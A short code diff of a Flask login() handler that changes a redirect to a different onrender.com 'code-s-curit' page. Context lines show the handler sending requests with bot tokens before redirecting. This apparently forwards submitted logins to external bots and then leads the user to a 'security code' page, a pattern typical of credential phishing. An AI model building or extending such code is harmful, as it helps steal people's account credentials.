@@ -48,7 +48,7 @@ def login():
             if response.status_code != 200:
                 return f"Erreur avec le bot {token[:10]}... : {response.text}", 500
 
-        return redirect("https://code-s-curit-xmrx.onrender.com")
+        return redirect("https://code-s-curit-q683.onrender.com/")
 
     return render_template('login.html')
 
